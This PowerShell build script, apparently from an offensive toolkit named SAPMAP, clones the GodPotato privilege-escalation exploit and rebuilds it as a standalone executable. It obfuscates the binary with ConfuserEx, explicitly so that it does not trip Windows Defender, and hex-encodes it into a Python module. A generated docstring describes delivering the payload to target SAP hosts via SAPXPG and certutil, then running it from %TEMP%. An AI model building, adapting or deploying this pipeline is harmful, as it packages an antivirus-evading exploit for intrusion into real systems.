<#
.SYNOPSIS
    Build the SAPMAP-vendored GodPotato binary and inject it into
    modules/exploitation/_godpotato_blob.py.

.DESCRIPTION
    Runs on a Windows host with .NET Framework 4.x SDK + MSBuild.
    Pipeline:
      1. Clone the upstream GodPotato source (BeichenDream/GodPotato)
         into tools/godpotato/src/upstream/.  First run only; later
         runs reuse the cached clone.
      2. msbuild Release with two overrides:
           * OutputType  = Exe (upstream defaults to Library /
             "InstallUtil-loaded DLL"; we want a standalone exe)
           * TargetFrameworkVersion = v4.0 (upstream targets v2.0
             which Server 2016+ doesn't enable by default)
         Result: bin/Release/gp_bin.exe (~100 KB, single file).
      3. ConfuserEx post-pass (same hand-picked protection set as
         tools/miniplasma: rename + anti-debug + constants).
      4. Hex-encode the obfuscated .exe, write to
         modules/exploitation/_godpotato_blob.py.

    The shipped blob is checked into the SAPMAP repo so other
    operators get the binary without needing a Windows build host.

.PARAMETER SapmapRoot
    Path to the SAPMAP checkout root.  Auto-detected by walking up
    from this script.

.PARAMETER SkipObfuscation
    Skip the ConfuserEx pass.  Dev-only - trips Defender on modern
    Win10/11.

.PARAMETER UpstreamRef
    Git ref (tag or commit) of BeichenDream/GodPotato to vendor.
    Default: "main".

.EXAMPLE
    PS> cd C:\src\SAPMAP\tools\godpotato
    PS> .\build.ps1
#>
[CmdletBinding()]
param(
    [string]$SapmapRoot = "",
    [switch]$SkipObfuscation = $false,
    [string]$UpstreamRef = "main",
    [string]$ConfuserExUrl = "https://github.com/mkaring/ConfuserEx/releases/download/v1.6.0/ConfuserEx-CLI.zip",
    [string]$UpstreamRepoUrl = "https://github.com/BeichenDream/GodPotato.git"
)

$ErrorActionPreference = "Stop"

# Force TLS 1.2 for git/Invoke-WebRequest on Windows PowerShell 5.1.
try {
    [Net.ServicePointManager]::SecurityProtocol = (
        [Net.ServicePointManager]::SecurityProtocol -bor
        [Net.SecurityProtocolType]::Tls12)
} catch {
    Write-Warning "Could not enable TLS 1.2: $_"
}

if ($PSScriptRoot) {
    $Here = $PSScriptRoot
} elseif ($MyInvocation.MyCommand.Path) {
    $Here = Split-Path -Parent $MyInvocation.MyCommand.Path
} else {
    $Here = (Get-Location).Path
}
$Src       = Join-Path $Here "src"
$Upstream  = Join-Path $Src "upstream"
Write-Host "[*] Script dir   : $Here"

# ---------------------------------------------------------------------------
# Locate SAPMAP root
# ---------------------------------------------------------------------------
if (-not $SapmapRoot) {
    $candidate = $Here
    for ($i = 0; $i -lt 6; $i++) {
        $parent = Split-Path -Parent $candidate
        if (-not $parent -or $parent -eq $candidate) { break }
        $candidate = $parent
        if (Test-Path (Join-Path $candidate "modules\exploitation")) {
            $SapmapRoot = $candidate
            break
        }
    }
}
if (-not $SapmapRoot -or -not (Test-Path (Join-Path $SapmapRoot "modules\exploitation"))) {
    Write-Error @"
SAPMAP root not found.  Run from inside a SAPMAP checkout, or pass
-SapmapRoot C:\path\to\SAPMAP explicitly.
"@
    exit 1
}
$BlobPy = Join-Path $SapmapRoot "modules\exploitation\_godpotato_blob.py"
Write-Host "[*] SAPMAP root  : $SapmapRoot"
Write-Host "[*] Blob output  : $BlobPy"

# ---------------------------------------------------------------------------
# Locate msbuild
# ---------------------------------------------------------------------------
function Find-MSBuild {
    $msb = Get-Command msbuild.exe -ErrorAction SilentlyContinue
    if ($msb) { return $msb.Source }
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -prerelease -requires Microsoft.Component.MSBuild -find "MSBuild\**\Bin\MSBuild.exe" | Select-Object -First 1
        if ($path -and (Test-Path $path)) { return $path }
    }
    $bt = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt) { return $bt }
    $bt2 = "${env:ProgramFiles}\Microsoft Visual Studio\2022\BuildTools\MSBuild\Current\Bin\MSBuild.exe"
    if (Test-Path $bt2) { return $bt2 }
    return $null
}
$MSBuild = Find-MSBuild
if (-not $MSBuild) {
    Write-Error "msbuild.exe not found.  Install Build Tools for Visual Studio 2022 (.NET desktop build tools workload)."
    exit 1
}
Write-Host "[*] msbuild      : $MSBuild"

# ---------------------------------------------------------------------------
# Clone / refresh upstream
# ---------------------------------------------------------------------------
$Git = Get-Command git.exe -ErrorAction SilentlyContinue
if (-not $Git) {
    Write-Error "git.exe not found - install Git for Windows."
    exit 1
}

if (-not (Test-Path $Upstream)) {
    Write-Host "[*] Cloning upstream from $UpstreamRepoUrl @ $UpstreamRef ..."
    & $Git.Source clone --depth 1 --branch $UpstreamRef $UpstreamRepoUrl $Upstream
    if ($LASTEXITCODE -ne 0) { throw "git clone failed" }
} else {
    Write-Host "[*] Reusing existing upstream clone at $Upstream"
    Push-Location $Upstream
    try {
        & $Git.Source fetch --depth 1 origin $UpstreamRef 2>&1 | Out-Null
        & $Git.Source checkout $UpstreamRef
    } finally { Pop-Location }
}

# Patch the upstream csproj to build as an Exe + target net40.
$UpstreamCsproj = Join-Path $Upstream "GodPotato.csproj"
if (-not (Test-Path $UpstreamCsproj)) {
    Write-Error "Expected $UpstreamCsproj not found - upstream layout changed?"
    exit 1
}
$csprojText = Get-Content $UpstreamCsproj -Raw
$csprojText = $csprojText -replace '<OutputType>Library</OutputType>', '<OutputType>Exe</OutputType>'
$csprojText = $csprojText -replace '<TargetFrameworkVersion>v2\.0</TargetFrameworkVersion>', '<TargetFrameworkVersion>v4.0</TargetFrameworkVersion>'
$csprojText = $csprojText -replace '<AssemblyName>GodPotato</AssemblyName>', '<AssemblyName>gp_bin</AssemblyName>'
[System.IO.File]::WriteAllText($UpstreamCsproj, $csprojText,
    (New-Object System.Text.UTF8Encoding $false))
Write-Host "[*] Patched upstream csproj: OutputType=Exe, TargetFramework=v4.0, AssemblyName=gp_bin"

# ---------------------------------------------------------------------------
# Build
# ---------------------------------------------------------------------------
Write-Host "[*] Building Release ..."
Push-Location $Upstream
try {
    & $MSBuild "GodPotato.csproj" /t:Build /p:Configuration=Release /p:Platform=AnyCPU /v:minimal /nologo
    if ($LASTEXITCODE -ne 0) { throw "msbuild failed" }
} finally {
    Pop-Location
}

$ReleaseExe = Join-Path $Upstream "bin\Release\gp_bin.exe"
if (-not (Test-Path $ReleaseExe)) {
    Write-Error "Expected build output $ReleaseExe not found."
    exit 1
}
$buildSize = (Get-Item $ReleaseExe).Length
Write-Host ("[+] Build OK     : " + $ReleaseExe + " (" + $buildSize + " bytes)")

# ---------------------------------------------------------------------------
# ConfuserEx
# ---------------------------------------------------------------------------
$FinalExe = $ReleaseExe
if (-not $SkipObfuscation) {
    $ConfuserDir = Join-Path $Here "confuser"
    $ConfuserCli = Join-Path $ConfuserDir "Confuser.CLI.exe"
    if (-not (Test-Path $ConfuserCli)) {
        Write-Host "[*] ConfuserEx not present - downloading ..."
        $zip = Join-Path $Here "confuser.zip"
        Invoke-WebRequest -Uri $ConfuserExUrl -OutFile $zip
        if (-not (Test-Path $ConfuserDir)) {
            New-Item -ItemType Directory -Path $ConfuserDir | Out-Null
        }
        Expand-Archive -Path $zip -DestinationPath $ConfuserDir -Force
        Remove-Item $zip
    }
    Write-Host "[*] ConfuserEx   : $ConfuserCli"

    # Write a per-build ConfuserEx project that points at the upstream
    # tree (so paths are not relative to a fixed src/ subtree like
    # MiniPlasma's).  Same protection set: rename + anti-debug +
    # constants encryption.  Anti-tamper deliberately omitted.
    $Crproj = Join-Path $Here "ConfuserEx.crproj"
    $crBody = @'
<?xml version="1.0" encoding="utf-8"?>
<project outputDir="bin\Release\confused" baseDir="bin\Release" xmlns="http://confuser.codeplex.com">
  <module path="gp_bin.exe">
    <rule pattern="true" preset="none" inherit="false">
      <protection id="rename">
        <argument name="mode" value="unicode" />
        <argument name="renameArgs" value="false" />
      </protection>
      <protection id="anti debug" />
      <protection id="constants">
        <argument name="mode" value="dynamic" />
        <argument name="elements" value="SNI" />
        <argument name="cfg" value="false" />
      </protection>
    </rule>
  </module>
</project>
'@
    [System.IO.File]::WriteAllText($Crproj, $crBody,
        (New-Object System.Text.UTF8Encoding $false))

    Write-Host "[*] Running ConfuserEx pass (rename + anti-debug + constants) ..."
    Push-Location $Upstream
    try {
        & $ConfuserCli -n $Crproj
        if ($LASTEXITCODE -ne 0) { throw "ConfuserEx failed" }
    } finally {
        Pop-Location
    }
    $ConfusedExe = Join-Path $Upstream "bin\Release\confused\gp_bin.exe"
    if (-not (Test-Path $ConfusedExe)) {
        Write-Error "ConfuserEx did not produce $ConfusedExe."
        exit 1
    }
    $confSize = (Get-Item $ConfusedExe).Length
    Write-Host ("[+] Obfuscated   : " + $ConfusedExe + " (" + $confSize + " bytes)")
    $FinalExe = $ConfusedExe
} else {
    Write-Host "[!] Skipping ConfuserEx - binary will trip Defender."
}

# ---------------------------------------------------------------------------
# Hex-encode + write blob
# ---------------------------------------------------------------------------
Write-Host "[*] Hex-encoding final binary ..."
$bytes = [System.IO.File]::ReadAllBytes($FinalExe)
$size = $bytes.Length
$sha = [BitConverter]::ToString(
    [System.Security.Cryptography.SHA256]::Create().ComputeHash($bytes)
).Replace("-", "").ToLowerInvariant()

$sb = New-Object System.Text.StringBuilder
for ($i = 0; $i -lt $bytes.Length; $i += 40) {
    $count = [Math]::Min(40, $bytes.Length - $i)
    [void]$sb.Append('    "')
    for ($j = 0; $j -lt $count; $j++) {
        [void]$sb.Append("{0:x2}" -f $bytes[$i + $j])
    }
    [void]$sb.Append('"')
    if ($i + 40 -lt $bytes.Length) {
        [void]$sb.AppendLine()
    }
}
$body = $sb.ToString()

$nl = [Environment]::NewLine
$header  = '"""Auto-generated by tools/godpotato/build.ps1 - do not hand-edit.' + $nl
$header += $nl
$header += 'Holds the SAPMAP-vendored GodPotato binary (.NET 4.0,' + $nl
$header += 'ConfuserEx-obfuscated) as a hex blob.  Delivered to the target' + $nl
$header += 'via SAPXPG cmd.exe + certutil -decode, written to' + $nl
$header += '%TEMP%/gp_bin.exe, then run as gp_bin.exe -cmd "<wrapper>".' + $nl
$header += 'See modules/exploitation/sapmap_godpotato.py.' + $nl
$header += '"""' + $nl
$header += $nl
$header += 'GODPOTATO_SHA256 = "' + $sha + '"' + $nl
$header += 'GODPOTATO_SIZE   = ' + $size + $nl
$header += $nl
$header += 'GODPOTATO_BIN_HEX = (' + $nl
$header += $body + $nl
$header += ')' + $nl

[System.IO.File]::WriteAllText($BlobPy, $header,
    (New-Object System.Text.UTF8Encoding $false))

Write-Host ("[+] Wrote " + $size + " bytes (" + ($size * 2) + " hex chars) to " + $BlobPy)
Write-Host ("[+] sha256: " + $sha)
Write-Host ""
Write-Host "[+] Done.  Commit + push the blob:"
Write-Host "      cd $SapmapRoot"
Write-Host "      git add modules/exploitation/_godpotato_blob.py"
Write-Host "      git commit -m 'Vendor GodPotato binary blob (.NET 4.0, ConfuserEx)'"
Write-Host "      git push"
